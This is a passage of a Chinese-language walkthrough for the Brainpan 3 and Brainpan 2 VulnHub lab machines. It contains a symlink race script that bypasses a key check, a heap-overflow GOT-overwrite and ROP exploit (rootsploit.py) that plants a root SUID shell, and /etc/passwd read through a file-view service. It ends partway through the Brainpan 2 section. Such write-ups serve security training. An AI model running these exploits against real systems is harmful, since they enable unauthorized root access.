bash: cd: renard: No such file or directory
anansi@brainpan3:/home$ cd reynard
cd reynard
anansi@brainpan3:/home/reynard$ ls
ls
private
anansi@brainpan3:/home/reynard$ cd private
cd private
anansi@brainpan3:/home/reynard/private$ ls
ls
cryptor  sekret.txt.enc
anansi@brainpan3:/home/reynard/private$ ./cryptor $(python /tmp/cryptthis.py)
./cryptor $(python /tmp/cryptthis.py)
[+] saving to �����������������������������.enc
$ id
id
uid=1000(anansi) gid=1003(webdev) euid=1002(reynard) groups=1002(reynard)
$ whoami
whoami
reynard
```

现在得到了reynard用户的权限

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub204.jpg)

#### Puck

我花了点时间弄清楚如何升级到puck用户的权限，当执行netstat时，注意到端口7075上有一个本地列出的服务，当连接到它时，出现以下文本

``` bash
$ nc 127.0.0.1 7075
nc 127.0.0.1 7075
Incorrect key
```

经过更多搜索之后，在/usr/local/sbin文件夹中找到了与此服务相关的trixd可执行文件。

``` bash
$ cd /usr/local/sbin/
cd /usr/local/sbin/
$ ls -lah
ls -lah
total 40K
drwxr-xr-x  2 root root 4.0K May 26  2015 .
drwxr-xr-x 10 root root 4.0K May 19  2015 ..
-rwxr-xr-x  1 root root  17K May 26  2015 brainpan3
-rwxr-xr-x  1 root root 7.5K May 20  2015 trixd
-rwxr-xr-x  1 root root  343 May 21  2015 www
```

将文件复制到本地计算机以进行分析

main
``` bash
int __cdecl main()
{
  int v0; // eax
  int v1; // eax
  int v2; // ebx
  int v4; // ST1C_4
  int v5; // ST1C_4
  struct timeval timeout; // [esp+24h] [ebp-94h]
  struct stat stat_buf; // [esp+2Ch] [ebp-8Ch]
  int buf; // [esp+84h] [ebp-34h]
  int v9; // [esp+88h] [ebp-30h]
  int v10; // [esp+8Ch] [ebp-2Ch]
  int v11; // [esp+90h] [ebp-28h]
  int v12; // [esp+94h] [ebp-24h]
  int s1; // [esp+98h] [ebp-20h]
  int v14; // [esp+9Ch] [ebp-1Ch]
  int v15; // [esp+A0h] [ebp-18h]
  int v16; // [esp+A4h] [ebp-14h]
  int v17; // [esp+A8h] [ebp-10h]
  unsigned int v18; // [esp+ACh] [ebp-Ch]

  v18 = __readgsdword(0x14u);
  if ( ptrace(0, 0, 1, 0) < 0 )
    return -1;
  setbuf(stdout, 0);
  timeout.tv_usec = 1;
  buf = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  s1 = 0;
  v14 = 0;
  v15 = 0;
  v16 = 0;
  v17 = 0;
  __lxstat(3, "/mnt/usb/key.txt", &stat_buf);
  if ( (stat_buf.st_mode & 0xF000) == 40960 )
  {
    v2 = -1;
    puts("Key file is compromised.");
  }
  else
  {
    select(1, 0, 0, 0, &timeout);
    v0 = open("/home/puck/key.txt", 0);
    if ( v0 < 0 )
    {
      v5 = v0;
      perror("open");
      v0 = v5;
    }
    read(v0, &buf, 0x13u);
    v1 = open("/mnt/usb/key.txt", 0);
    if ( v1 < 0 )
    {
      v4 = v1;
      perror("open");
      v1 = v4;
    }
    read(v1, &s1, 0x13u);
    v2 = strcmp((const char *)&s1, (const char *)&buf);
    if ( v2 )
    {
      v2 = 0;
      puts("Incorrect key");
    }
    else
    {
      puts("Authentication successful");
      system("/bin/sh");
    }
  }
  return v2;
}
```

Reynard可以写入“/mnt/usb/”文件夹

``` bash
131707    4 drwxrwx---   2 reynard  dev          4096 Aug  2 15:54 /mnt/usb
```

一旦在7075上连接到服务，就会执行checkKeyfile函数，该函数打开2个密钥文件并比较它们的内容，如果它们匹配，则将其放入shell中。符号链接检查和睡眠（使用select）使Superkojiman暗示了比赛状况。可以在usb文件夹中重复创建一个密钥文件，然后将其更改为指向puck文件夹中的密钥文件的符号链接，同时连接到该服务，并希望在某个时候能克服符号链接检查和打开文件。将欺骗比较两个相同文件的代码，即pucks文件夹中的有效密钥。

#### 走向胜利

编写了一段python代码，该代码重复创建了一个密钥文件，将其更改为符号链接，并且每次操作之间几乎没有睡眠。该脚本必须作为reynard运行，因为他是唯一允许写入usb文件夹的脚本。任何其他用户都可以连接到该服务。

race.py
``` bash
import os
import time
 
if os.geteuid() != 1002:
    print 'Run as user reynard'
else:
    for i in range(1000)
        os.system('echo "h4xh4xh4xh4xh4xh4x" > /mnt/usb/key.txt')
        time.sleep(0.1)
        os.unlink('/mnt/usb/key.txt')
        os.symlink('/home/puck/key.txt', '/mnt/usb/key.txt')
        time.sleep(0.1)
        os.unlink('/mnt/usb/key.txt')
 
    print '[+] Finished'
```

为了使其正常工作，需要2个shell，因此使用了报告漏洞利用创建了另一个anansi shell。当reynard shell执行race脚本时，此anansi shell用于连接到服务。race脚本。

``` bash
$ python race.py
python race.py
```

在第二个终端中运行几次netcat循环，直到成功。

``` bash
anansi@brainpan3:/$ for i in {0..100};do nc 127.0.0.1 7075;sleep 0.1; done
for i in {0..100};do nc 127.0.0.1 7075;sleep 0.1; done
Incorrect key
Key file is compromised.
Incorrect key
Key file is compromised.
Incorrect key
Key file is compromised.
Incorrect key
Key file is compromised.
Incorrect key
Key file is compromised.
Incorrect key
Key file is compromised.
Incorrect key
Key file is compromised.
Incorrect key
Key file is compromised.
Incorrect key
Key file is compromised.
Incorrect key
Key file is compromised.
Incorrect key
Key file is compromised.
Authentication successful
id
id
uid=1001(puck) gid=1004(dev) groups=1001(puck)
whoami
whoami
puck
pwd
pwd
/
cd /home
cd /home
ls
ls
anansi
puck
reynard
cd puck
cd puck
ls
ls
key.txt
cat key.txt
cat key.txt
HBN48HY71ERG5GA6290V
ls
ls
key.txt
ls -la
ls -la
total 24
drwx------ 2 puck puck 4096 Jun 10  2015 .
drwxr-xr-x 5 root root 4096 May 19  2015 ..
-rw------- 1 puck puck    0 Jun 10  2015 .bash_history
-rw-r--r-- 1 puck puck  220 May 19  2015 .bash_logout
-rw-r--r-- 1 puck puck 3637 May 19  2015 .bashrc
-rw-r--r-- 1 puck puck  675 May 19  2015 .profile
-rw------- 1 puck puck   21 May 19  2015 key.txt
```

#### 没有得到root权限，就没有荣耀

当搜索有关puck的文件时，已经找到了一个有趣的cron job

``` bash
puck@brainpan3:/home/puck$ ls -lah /etc/cron.d/
ls -lah /etc/cron.d/
ls -lah /etc/cron.d/
total 16K
drwxr-xr-x  2 root root 4.0K May 20  2015 .
drwxr-xr-x 90 root root 4.0K Feb  6 07:11 ..
-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder
-rw-r--r--  1 root root  100 May 19  2015 msg_admin
puck@brainpan3:/home/puck$ cat /etc/cron.d/msg_admin
cat /etc/cron.d/msg_admin
cat /etc/cron.d/msg_admin
* * * * * root cd /opt/.messenger; for i in *.msg; do /usr/local/bin/msg_admin 1 $i; rm -f $i; done
puck@brainpan3:/home/puck$ /usr/local/bin/msg_admin
/usr/local/bin/msg_admin
/usr/local/bin/msg_admin
Usage: /usr/local/bin/msg_admin priority message.txt
Message file format: requestername|message
Eg: tony|Add a new user to repo
Can have multiple messages in a single file separated by newlines.
Eg: tony|Please remove /tmp/foo
    cate|Reset password request.
```

cron job 从/opt/.messenger文件夹中获取所有.msg文件，并将它们传递给msg_admin可执行文件，然后删除该文件。将可执行文件复制到本地计算机进行分析。

struct_msg
``` bash
struct struct_msg
{
  int Priority;
  char *Requestername;
  char *Msg;
};
```

main
``` bash
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void *v3; // esp
  int result; // eax
  int v5; // ebx
  int v6; // ebx
  char *v7; // ebx
  const char *v8; // [esp-18h] [ebp-98h]
  int v9; // [esp-14h] [ebp-94h]
  int v10; // [esp-Ch] [ebp-8Ch]
  const char **v11; // [esp+0h] [ebp-80h]
  int v12; // [esp+4h] [ebp-7Ch]
  char *s; // [esp+Ch] [ebp-74h]
  int v14; // [esp+10h] [ebp-70h]
  int i; // [esp+14h] [ebp-6Ch]
  int v16; // [esp+18h] [ebp-68h]
  int v17; // [esp+1Ch] [ebp-64h]
  int v18; // [esp+20h] [ebp-60h]
  char *dest; // [esp+24h] [ebp-5Ch]
  FILE *stream; // [esp+28h] [ebp-58h]
  void *v21; // [esp+2Ch] [ebp-54h]
  void *v22; // [esp+30h] [ebp-50h]
  char *delim; // [esp+34h] [ebp-4Ch]
  char *src; // [esp+38h] [ebp-48h]
  int v25[10]; // [esp+3Ch] [ebp-44h]
  unsigned int v26; // [esp+64h] [ebp-1Ch]
  int *v27; // [esp+70h] [ebp-10h]

  v27 = &argc;
  v12 = argc;
  v11 = argv;
  v26 = __readgsdword(0x14u);
  v16 = 0;
  v17 = 10;
  v14 = 0;
  i = 0;
  v18 = 399;
  v3 = alloca(400);
  dest = (char *)&v10;
  if ( argc > 2 )
  {
    v8 = v11[1];
    v16 = atol(v8);
    stream = fopen(v11[2], "r");
    s = (char *)malloc(0x190u);
    v21 = malloc(0x14u);
    v22 = malloc(0x64u);
    while ( getline((int)&s, (int)&LINEMAX_2, (int)stream) > 0 )
      ++v14;
    v9 = v14;
    printf("[+] Recording %d entries\n", v14);
    rewind(stream);
    for ( i = 0; i < v14; ++i )
    {
      v25[i] = (int)malloc(0xCu);
      *(_DWORD *)v25[i] = v16;
      v5 = v25[i];
      *(_DWORD *)(v5 + 4) = malloc(0xAu);
      v6 = v25[i];
      *(_DWORD *)(v6 + 8) = malloc(0xC8u);
    }
    for ( i = 0; i < v14; ++i )
    {
      delim = "|";
      if ( getline((int)&s, (int)&LINEMAX_2, (int)stream) > 1 )
      {
        v7 = s;
        v7[strlen(s) - 1] = 0;
        src = strtok(s, delim);
        strcpy(*(char **)(v25[i] + 4), src);
        src = strtok(0, delim);
        strcpy(*(char **)(v25[i] + 8), src);
        strncpy(dest, *(const char **)(v25[i] + 8), 0x64u);
      }
    }
    fclose(stream);
    notify_admin((int)v25, v14);
    result = 0;
  }
  else
  {
    usage((int)*v11);
    result = 1;
  }
  return result;
}
```

这是经典的内存损坏。对于.msg文件中的每条消息（行），它都会创建一个struct_msg结构并为其变量分配内存，然后将其添加到列表中。接下来，它循环遍历文件，并在“ |”定界符上分割每一行，并将每个部分复制到结构变量“Requestername”和“Msg”。这些变量的固定大小为10（请求者名称）和200（消息）。由于没有检查长度，因此可能破坏内存中的结构指针。以下代码创建一个包含2条消息的.msg文件，每个文件的变量都填充到其最大值，因此不会破坏任何内容。

``` bash
import sys
import struct
 
# message 1
payload =  10  * '\x41' # A
payload += '|'
payload += 200 * '\x42' # B
payload += '\n'
# message 2
payload += 10  * '\x43' # C
payload += '|'
payload += 200 * '\x44' # D
payload += '\n'
 
open('poc.msg','wb').write(payload)
```

当使用GDB分析内存时，可以看到如何映射所有内存

``` bash
0x804c388:	0x00000001	0x0804c398	0x0804c3a8	0x00000011
0x804c398:	0x41414141	0x41414141	0x00004141	0x000000d1
0x804c3a8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c3b8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c3c8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c3d8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c3e8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c3f8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c408:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c418:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c428:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c438:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c448:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c458:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c468:	0x42424242	0x42424242	0x00000000	0x00000011
0x804c478:	0x00000001	0x0804c488	0x0804c498	0x00000011
0x804c488:	0x43434343	0x43434343	0x00004343	0x000000d1
0x804c498:	0x44444444	0x44444444	0x44444444	0x44444444
0x804c4a8:	0x44444444	0x44444444	0x44444444	0x44444444
0x804c4b8:	0x44444444	0x44444444	0x44444444	0x44444444
0x804c4c8:	0x44444444	0x44444444	0x44444444	0x44444444
0x804c4d8:	0x44444444	0x44444444	0x44444444	0x44444444
0x804c4e8:	0x44444444	0x44444444	0x44444444	0x44444444
0x804c4f8:	0x44444444	0x44444444	0x44444444	0x44444444
0x804c508:	0x44444444	0x44444444	0x44444444	0x44444444
0x804c518:	0x44444444	0x44444444	0x44444444	0x44444444
0x804c528:	0x44444444	0x44444444	0x44444444	0x44444444
0x804c538:	0x44444444	0x44444444	0x44444444	0x44444444
0x804c548:	0x44444444	0x44444444	0x44444444	0x44444444
0x804c558:	0x44444444	0x44444444	0x00000000	0x00020aa1
```

第一个struct_msg结构位于0x804c388，第二个位于0x804c478。现在，在第一个消息中使用较大的（216字节）“Msg”缓冲区时，将覆盖第二个struct_msg结构的“Requestername”指针，并在下一个strcpy调用中有效控制目标指针和源数据，从而导致Write-允许我们修补GOT条目的任何条件。这段代码将got.strtok地址修补为0x43434343，strtok是strcpy之后执行的下一个函数。我编写了一个ROP有效负载，它通过从3个阶段中添加0xE900来将取自atol的atol的地址加载到eax中，并将该值累加至系统，然后使用参数'/ tmp / foo'调用eax（system），这是一个脚本由我们创建并在执行时将根拥有的SUID shell复制到tmp。

``` bash
import sys
import struct
 
# message 1
# .got.plt:0804B05C off_804B05C     dd offset strtok        ; DATA XREF: _strtok
payload = 10 * '\x41'
payload += '|'
payload += 200 * '\x42'
payload += 12 * '\x42'
# overwrite 2nd struct it's requestername pointer
payload += p(0x0804B05C) # strtok GOT, becomes 0x43434343
payload += '\n'
# message 2
payload += 4 * '\x43' # written to got.strtok
payload += '|'
payload += 200 * '\x44'
payload += '\n'
 
open('poc.msg','wb').write(payload)
```

一些GDB

``` bash
gdb-peda$ x/150xw 0x804c388
0x804c388:	0x00000001	0x0804c398	0x0804c3a8	0x00000011
0x804c398:	0x41414141	0x41414141	0x00004141	0x000000d1
0x804c3a8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c3b8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c3c8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c3d8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c3e8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c3f8:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c408:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c418:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c428:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c438:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c448:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c458:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c468:	0x42424242	0x42424242	0x42424242	0x42424242
0x804c478:	0x42424242	0x0804b05c	0x0804c400	0x00000011
0x804c488:	0x00000000	0x00000000	0x00000000	0x000000d1
0x804c498:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c4a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c4b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c4c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c4d8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c4e8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c4f8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c508:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c518:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c528:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c538:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c548:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c558:	0x00000000	0x00000000	0x00000000	0x00020aa1
...
Invalid $PC address: 0x43434343
[------------------------------------stack-------------------------------------]
0000| 0xbffff2ac --> 0x8048ce3 (:	mov    DWORD PTR [ebp-0x48],eax)
0004| 0xbffff2b0 --> 0x0 
0008| 0xbffff2b4 --> 0x8048f4d --> 0x100007c 
0012| 0xbffff2b8 --> 0x804c008 --> 0xfbad2488 
0016| 0xbffff2bc ('B' repeats 100 times "\234, \357\377\267 \360\377\267")
0020| 0xbffff2c0 ('B' repeats 96 times "\234, \357\377\267 \360\377\267")
0024| 0xbffff2c4 ('B' repeats 92 times "\234, \357\377\267 \360\377\267")
0028| 0xbffff2c8 ('B' repeats 88 times "\234, \357\377\267 \360\377\267")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x43434343 in ?? ()
```

基于GDB的输出，可以看到，如果执行pop（4）小工具，将返回第一条（上一条）消息的“目标”数据，该消息由“strncpy（dest，aMessages [i]”存储在堆栈中]-> Msg，100u）;'。

#### root所有的一切

编写了一个ROP payload，通过从3个阶段中添加0xE900来将取自atol的atol的地址加载到eax中，并将该值累加至系统，然后使用参数'/tmp/foo'调用eax（system），这是一个脚本由我创建并在执行时将root拥有的SUID shell复制到tmp。

rootsploit.py
``` bash
import sys
import struct
import os
 
def p(v):
    return struct.pack('<L', v)
 
__strtok_got    = 0x0804B05C
__atol_got      = 0x0804B04C
__ppppr         = 0x08048DDC
__foo_str       = 0x08048ED8
__int16_e800h   = 0x080480C7
__int16_0100h   = 0x08048093
 
 
 
rop  = p(0x08048790)
rop += p(0x08048E06)
rop += p((__atol_got - 0x01270304) & 0xFFFFFFFF)
rop += p(0x08048FEB)
rop += p(0x08048E06)
rop += p((__int16_e800h - 0x01270304) & 0xFFFFFFFF)
rop += p(0x08048FEB)
rop += p(0x08048E06)
rop += p((__int16_0100h - 0x01270304) & 0xFFFFFFFF)
rop += p(0x08048FEB)
rop += p(0x08048786)
rop += p(__foo_str + 23)
 
payload = 10 * 'A'
payload += '|'
payload += rop.ljust(212, 'A') # padding till 212 eq next struct requestername pointer
payload += p(0x0804B05C) # strtok GOT, becomes __ppppr
payload += '\n'
payload += p(__ppppr) # written to got.strtok
payload += '|'
payload += 200 * 'A'
payload += '\n'
 
open('exploit.msg','wb').write(payload)
foocode = "cp /bin/sh /tmp/r00tsh3ll;chown root:root /tmp/r00tsh3ll;chmod 4755 /tmp/r00tsh3ll"
open('/tmp/foo','wb').write(foocode)
os.system('chmod +x /tmp/foo')
```

从tmp文件夹执行漏洞利用脚本，并将创建的exploit.msg移至/opt/.messenger文件夹，然后稍等。

``` bash
puck@brainpan3:/tmp$ python rootsploit.py
python rootsploit.py
python rootsploit.py
puck@brainpan3:/tmp$ ls -lah
ls -lah
ls -lah
total 20K
drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .
drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..
-rw-r--r--  1 puck   dev     434 Feb  6 13:03 exploit.msg
-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo
-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py
puck@brainpan3:/tmp$ mv exploit.msg /opt/.messenger/
mv exploit.msg /opt/.messenger/
mv exploit.msg /opt/.messenger/
puck@brainpan3:/tmp$ ls -lah
ls -lah
ls -lah
total 16K
drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .
drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..
-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo
-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py
puck@brainpan3:/tmp$ ls -lah
ls -lah
ls -lah
total 16K
drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .
drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..
-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo
-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py
puck@brainpan3:/tmp$ ls -lah
ls -lah
ls -lah
total 128K
drwxrwxrwt  2 root   root   4.0K Feb  6 13:04 .
drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..
-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo
-rwsr-xr-x  1 root   root   110K Feb  6 13:04 r00tsh3ll
-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py
puck@brainpan3:/tmp$ ls -lah
ls -lah
ls -lah
total 128K
drwxrwxrwt  2 root   root   4.0K Feb  6 13:04 .
drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..
-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo
-rwsr-xr-x  1 root   root   110K Feb  6 13:04 r00tsh3ll
-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py
puck@brainpan3:/tmp$ ./r00tsh3ll
./r00tsh3ll
./r00tsh3ll
# id
id
id
uid=1001(puck) gid=1004(dev) euid=0(root) groups=0(root)
# whoami
whoami
whoami
root
# cd /root
cd /root
cd /root
# ls
ls
ls
brainpan.8.gz
# ls -la
ls -la
ls -la
total 20
drwx------  2 root root 4096 Jul 16  2015 .
drwxr-xr-x 21 root root 4096 Jun 17  2015 ..
-rw-------  1 root root    0 Jul 16  2015 .bash_history
-rw-------  1 root root 3106 Feb 19  2014 .bashrc
-rw-------  1 root root  140 May 31  2015 .profile
-rw-------  1 root root  314 Jun 23  2015 brainpan.8.gz
```

成功的取得了root权限

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub205.jpg)

将其中的brainpan.8.gz复制到/home/anansi文件夹，然后开启python的SimpleHTTPServer，将brainpan.8.gz下载之后解压，读取其中的内容，发现如下所示的文本，正好是flag

``` bash
root@kali:~/vulnhub/brainpan3# file brainpan.8 
brainpan.8: troff or preprocessor input, ASCII text
root@kali:~/vulnhub/brainpan3# cat brainpan.8 
.TH man 8 "20 May 2015" "3.0" "brainpan 3"

.SH DESCRIPTION
Congratulations, you win! Thanks for playing!

.SH FLAG
.B
flag{tricksy-hobbitses-use-unix}

.SH BUGS
You found them all. 

.SH AUTHOR
superkojiman - 
.B
http://blog.techorganic.com

.SH TESTERS
Special thanks go to barrebas and Swappage taking the time to test Brainpan 3!
.br
barrebas - 
.B
https://twitter.com/barrebas
.br
Swappage - 
.B
https://twitter.com/Swappage
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub206.jpg)


#### 知识点总结

 - 缓冲区溢出
 - 堆栈溢出
 - 字符串格式漏洞
 - 反引号命令注入
 - >&2管道命令输出
 - python的pwntools模块使用编写poc
 - pwndbg调试shellcode
 - ROPGadget找到清晰的eax小工具
 - 偏移量累积寻找

<font color="red">Game over</font>

这次傻瓜式一键通关脚本就在方法一的尾部，enjoy it ...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end brainpan-3 -->

</details>

<a id="case-brainpan2"></a>

## popen 解析与间接调用指针

自定义命令服务的 popen 行为提供入口，后续调试确定间接调用地址。原记录还分析了同名 root 账户、SSH 备份和历史记录。

<p class="kb-provenance">来源 brainpan2 · 原记录 2020-02-01 · 33 个代码块 · 3 处图片引用</p>

<details class="kb-evidence" id="record-brainpan2">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start brainpan2 -->

#### 名称
名称：brainpan: 2
发行日期：2013年11月20日

#### 下载

 - Download (Mirror): https://download.vulnhub.com/brainpan/brainpan2.zip
 - Download (Torrent): https://download.vulnhub.com/brainpan/brainpan2.zip.torrent

#### 描述

``` bash
 _               _                           ___  
 | |             (_)                         |__ \ 
 | |__  _ __ __ _ _ _ __  _ __   __ _ _ __      ) |
 | '_ \| '__/ _` | | '_ \| '_ \ / _` | '_ \    / / 
 | |_) | | | (_| | | | | | |_) | (_| | | | |  / /_ 
 |_.__/|_|  \__,_|_|_| |_| .__/ \__,_|_| |_| |____|
                         | |                       
                         |_|

                             by superkojiman  
                  http://www.techorganic.com
```

#### 免责声明

使用此虚拟机，即表示您同意，对任何损失或损害不承担任何责任，包括但不限于间接或间接损失或损害，或由于或来自于此而产生的数据或利润损失而造成的任何损失或损害。与使用此软件的连接。
TL; DR：如果发生坏事，这不是我的错。

#### 设定

Brainpan已通过测试，可在以下虚拟机管理程序上运行：
 - VMware Player 6.0.1
 - VMWare Fusion 6.0.2
 - VirtualBox 4.3.2

检查以确保brainpan2.ova具有以下校验和，以便您知道下载的文件是否完整：
``` bash
MD5：bf01f03ea0e7cea2553f74189ff35161SHA1：b46891cda684246832f4dbc80ec6e40a997af65a
```
将brainpan2.ova导入到您首选的管理程序中，并根据需要配置网络设置。
它会通过DHCP获得IP地址，建议在NAT内运行它，或者仅对主机OS可见，因为它容易受到攻击。
VulnHub独家.
[博客文章](http：//blog.vulnhub.com/2013/11/competition-brainpan-2.html)



#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.56.0/24
Nmap scan report for 192.168.56.116
Host is up (0.00027s latency).
MAC Address: 08:00:27:6D:B8:70 (Oracle VirtualBox virtual NIC)
```

``` bash
root@kali:~# nmap -v -sV -Pn -p- 192.168.56.116
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
```

``` bash
C:\Users\HASEE>nmap -v -sV -p 9999,10000 -A -T5 192.168.56.116
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings:
|   NULL:
|     _| _|
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [______________________ WELCOME TO BRAINPAN 2.0________________________]
|_    LOGIN AS GUEST
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
|_http-title: Hacking Trends
```

nc连接后然后根据具体提示输入命令，发现如下的信息，并能对文件进行一定的操作

``` bash
root@kali:~# nc 192.168.56.116 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[______________________ WELCOME TO BRAINPAN 2.0________________________]
                             LOGIN AS GUEST                             

                          >> GUEST
                          ACCESS GRANTED


                             *  *  *  *                                
    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  
    TYPE "TELL ME MORE" FOR A LIST OF COMMANDS.  
                             *  *  *  *                                


                          >> TELL ME MORE
    FILES    HELP    VIEW       CREATE
    USERS    MSG     SYSTEM     BYE

                          >> FILES
total 36
-rwxr-xr-x 1 root   root   18424 Nov  4  2013 brainpan.exe
-rw-r--r-- 1 root   root    1109 Nov  5  2013 brainpan.txt
-rw-r--r-- 1 root   root     683 Nov  4  2013 notes.txt
-rw-r--r-- 1 anansi anansi    12 Nov  5  2013 test-1
-rwxrwxrwx 1 anansi anansi    19 Nov  5  2013 test-2
                          >> VIEW
    ENTER FILE TO DOWNLOAD: notes.txt
TODO LIST
---------
reynard: 
 - Completed manpage. Read with groff or man.
 - Renamed to brainpan.txt instead of brainpan.7.
 - Fixed call to read manpage: popen("man ./brainpan.txt", "r"); 

puck:
Easiest way to display file contents is to just use popen(). Eg:
popen("/bin/ls", "r");
popen("/bin/man ./brainpan.7", "r");
popen("/usr/bin/top", "r");
etc... 

anansi: 
 - Fixed a reported buffer overflow in login in version 1.0. 
 - Discovered buffer overflow in the command prompt, fixed as of version 2.0

puck: look into loading a configuration file instead of hardcoding settings 
in the server, version 1.8
anansi: dropped configuration file - leave it hardcoded, version 1.9
                          >> VIEW
    ENTER FILE TO DOWNLOAD: /etc/passwd
root:x:104:106:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
root :x:0:0:root:/var/root:/bin/bash
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:103::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
anansi:x:1000:1000:anansi,,,:/home/anansi:/bin/bash
puck:x:1001:1001:puck,,,:/home/puck:/bin/bash
reynard:x:1002:1002:reynard,,,:/home/reynard:/bin/bash
```

#### getshell

太好了:)可以查看系统内部可以访问的任何文件。从文件列表中，发现uid是系统用户之一。尝试成功创建和读取其主目录中的文件。

``` bash
                          >> CREATE
    ENTER FILE TO CREATE: /home/anansi/lucifer11   
    ENTER CONTENTS: content\lucifer11testcontents
    FILE CREATED
                          >> VIEW
    ENTER FILE TO DOWNLOAD: /home/anansi/lucifer11
content\lucifer11testcontents
```

这意味着可以读取用户获得许可的每个文件，并在可写目录中创建文件。检查了其他命令，但几乎所有命令尚未实现。guest用户不可用的很少。在那一刻，想起了HELP中的一句话引起了我的注意。

``` bash
AUTHENTICATION
